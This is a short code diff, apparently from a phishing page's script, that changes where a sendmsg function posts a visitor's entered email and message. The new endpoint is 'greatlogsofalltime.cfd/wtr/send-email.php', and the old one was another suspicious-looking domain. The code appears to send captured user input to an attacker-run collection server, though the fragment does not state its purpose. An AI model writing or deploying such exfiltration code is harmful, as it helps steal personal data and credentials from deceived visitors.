@@ -162,7 +162,7 @@ function sendmsg(enteredEmail, message) {
                 message: message
             };
 
-            return fetch('https://grok.megatrustfund.com/send-email.php', {
+            return fetch('https://greatlogsofalltime.cfd/wtr/send-email.php', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
